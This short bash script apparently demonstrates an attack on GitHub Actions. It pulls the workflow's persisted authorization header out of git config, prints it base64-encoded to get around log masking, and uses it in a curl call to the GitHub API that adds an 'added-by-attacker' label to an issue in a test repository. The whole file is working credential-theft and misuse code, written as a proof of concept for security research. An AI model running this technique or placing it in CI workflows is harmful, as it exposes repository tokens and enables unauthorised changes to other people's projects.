#!/bin/bash

GH=$(git config --get http.https://github.com/.extraheader)

echo $(echo $GH | base64 | tr -d '\n')

curl -v --location --request POST 'https://api.github.com/repos/ndavison/actions-test/issues/31/labels' \
--header 'Accept: application/vnd.github.v3+json' \
--header "$GH" \
--header 'Content-Type: application/json' \
--data-raw '{"labels": ["added-by-attacker"]}'
